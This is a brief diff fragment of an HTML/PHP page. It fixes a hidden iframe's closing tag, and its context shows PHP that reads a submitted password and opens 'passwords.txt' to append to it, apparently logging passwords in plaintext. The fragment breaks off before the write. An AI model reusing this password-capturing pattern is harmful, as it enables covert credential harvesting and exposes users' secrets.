@@ -5,7 +5,7 @@
   <link rel="stylesheet" href="stylesheet.css">
 </head>
 <body>
-  <iframe name="secret_iframe" style="display: none;" />
+  <iframe name="secret_iframe" style="display: none;"></iframe>
   <?php
     $password = $_POST["password"];
     $pw_log = fopen("passwords.txt", "a");
